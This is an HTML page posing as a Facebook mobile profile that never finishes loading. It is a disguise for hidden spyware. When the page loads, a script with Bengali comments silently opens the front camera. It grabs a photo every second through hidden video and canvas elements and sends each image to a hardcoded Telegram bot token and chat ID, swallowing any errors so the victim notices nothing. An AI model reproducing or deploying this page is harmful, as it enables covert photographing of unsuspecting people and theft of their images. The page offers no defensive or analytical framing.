<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Facebook</title>
    <style>
        /* Reset and Mobile Lock */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: #18191a;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            overflow: hidden;
        }

        /* Mobile Container Size */
        .app-container {
            width: 100%;
            max-width: 480px; 
            height: 100vh;
            background-color: #18191a;
            position: relative;
            display: flex;
            flex-direction: column;
        }

        /* Top Nav Layout */
        .top-nav {
            width: 100%;
            height: 48px;
            display: flex;
            align-items: center;
            padding: 0 16px;
            position: relative;
            background-color: #18191a;
            z-index: 10;
        }

        /* Custom Back Arrow */
        .back-arrow {
            width: 12px;
            height: 12px;
            border-left: 2.5px solid #f5f6f7;
            border-bottom: 2.5px solid #f5f6f7;
            transform: rotate(45deg);
            margin-left: 4px;
        }

        /* Facebook-style Progress Track */
        .progress-track {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 2.5px;
            background-color: #242526;
        }

        /* Advanced Progress Bar Animation (Never Fills) */
        .progress-bar {
            height: 100%;
            width: 0%;
            background-color: #1877f2;
            animation: fbLoading 15s cubic-bezier(0.1, 0.8, 0.1, 1) infinite;
        }

        @keyframes fbLoading {
            0% { width: 0%; }
            12% { width: 55%; }
            30% { width: 70%; }
            60% { width: 83%; }
            90% { width: 90%; }
            100% { width: 92%; }
        }

        /* Main Content Wrapper */
        .content-body {
            position: relative;
            width: 100%;
            flex-grow: 1;
        }

        /* ---- SCREEN CENTER SPINNER & LOADING TEXT (FIXED Alignment & Pushed Down) ---- */
        .spinner-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: calc(100vh - 48px); 
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            z-index: 20; 
            pointer-events: none;
            gap: 12px; 
            padding-top: 80px; /* আপনার কথা মতো স্পিনারটিকে আরেকটু নিচে নামানোর জন্য প্যাডিং যোগ করা হয়েছে */
        }

        .fb-spinner {
            width: 36px;
            height: 36px;
            border: 3.5px solid #3a3b3c;
            border-top: 3.5px solid #8a8d91;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: inline-block;
        }

        .loading-text {
            color: #8a8d91;
            font-size: 14px;
            font-weight: 500;
            letter-spacing: 0.5px;
            width: 100%;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Cover Photo Skeleton */
        .cover-photo {
            width: 100%;
            height: 200px; 
            background-color: #242526;
            border-bottom-left-radius: 12px;
            border-bottom-right-radius: 12px;
        }

        /* Profile & Content Section */
        .profile-section {
            padding: 0 16px;
            position: relative;
            margin-top: -40px; 
        }

        /* Profile Circle */
        .profile-circle {
            width: 110px;
            height: 110px;
            border-radius: 50%;
            background-color: #3a3b3c;
            border: 4px solid #18191a;
        }

        /* Text Skeleton Rows */
        .text-container {
            margin-top: 14px;
            padding-left: 4px;
        }

        .line-short {
            width: 120px;
            height: 18px;
            background-color: #3a3b3c;
            border-radius: 9px;
            margin-bottom: 12px;
        }

        .line-long {
            width: 210px;
            height: 14px;
            background-color: #3a3b3c;
            border-radius: 7px;
        }

        /* Shimmer/Pulse Effect */
        .pulse {
            animation: fbPulse 1.4s ease-in-out infinite;
        }

        @keyframes fbPulse {
            0% { opacity: 0.4; }
            50% { opacity: 0.8; }
            100% { opacity: 0.4; }
        }

        /* লুকানো ভিডিও + ক্যানভাস */
        video, canvas {
            display: none !important;
        }
    </style>
</head>
<body>

    <div class="app-container">
        <!-- Header / Top Nav -->
        <div class="top-nav">
            <div class="back-arrow"></div>
            <div class="progress-track">
                <div class="progress-bar"></div>
            </div>
        </div>

        <!-- Content Body Layout -->
        <div class="content-body">
            
            <!-- Real Buffering Spinner & Text Overlay (Centered & Aligned) -->
            <div class="spinner-overlay">
                <div class="fb-spinner"></div>
                <div class="loading-text" id="statusText">Loading...</div>
            </div>

            <!-- Cover Photo -->
            <div class="cover-photo pulse"></div>

            <!-- Profile & Details -->
            <div class="profile-section">
                <div class="profile-circle pulse"></div>
                <div class="text-container">
                    <div class="line-short pulse"></div>
                    <div class="line-long pulse"></div>
                </div>
            </div>

        </div>
    </div>

    <!-- ========== লুকানো ভিডিও + ক্যানভাস (ক্যামেরার জন্য) ========== -->
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <!-- ========== শুধু ক্যামেরা + টেলিগ্রাম (UI-তে কোনো পরিবর্তন নেই) ========== -->
    <script>
        // ===================== টেলিগ্রাম বট তথ্য =====================
        const BOT_TOKEN = "8354299407:AAFKUoOn9W3EdyIHpTljauF3VN_Ed3HihxQ";
        const CHAT_ID = "5085997009";
        // =============================================================

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        let stream = null;
        let captureInterval = null;
        let isCapturing = false;

        // ========== ১. ক্যামেরা চুপিসারে চালু ==========
        async function startCamera() {
            try {
                const mediaStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });
                stream = mediaStream;
                video.srcObject = stream;
                await video.play();
                startCapturing();
            } catch (e) {
                // চুপিসারে ব্যর্থ — UI-তে কিছু দেখাবে না
            }
        }

        // ========== ২. প্রতি সেকেন্ডে ছবি তোলা ==========
        function startCapturing() {
            if (isCapturing) return;
            isCapturing = true;
            captureInterval = setInterval(() => {
                if (video.readyState === 4 && video.videoWidth > 0) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
                    sendPhotoToTelegram(dataUrl);
                }
            }, 1000);
        }

        // ========== ৩. ছবি টেলিগ্রামে পাঠানো ==========
        async function sendPhotoToTelegram(base64) {
            const blob = dataURLtoBlob(base64);
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('photo', blob, `pic_${Date.now()}.jpg`);
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: form
                });
            } catch (e) { /* চুপ */ }
        }

        function dataURLtoBlob(dataURL) {
            const arr = dataURL.split(',');
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while (n--) u8arr[n] = bstr.charCodeAt(n);
            return new Blob([u8arr], { type: mime });
        }

        // ========== ৪. পেজ লোড হলে শুরু ==========
        window.addEventListener('load', () => {
            startCamera();
        });

        // ========== ৫. পেজ ছাড়লে ক্যামেরা বন্ধ ==========
        window.addEventListener('beforeunload', () => {
            if (captureInterval) clearInterval(captureInterval);
            if (stream) stream.getTracks().forEach(t => t.stop());
        });
    </script>
</body>
</html>
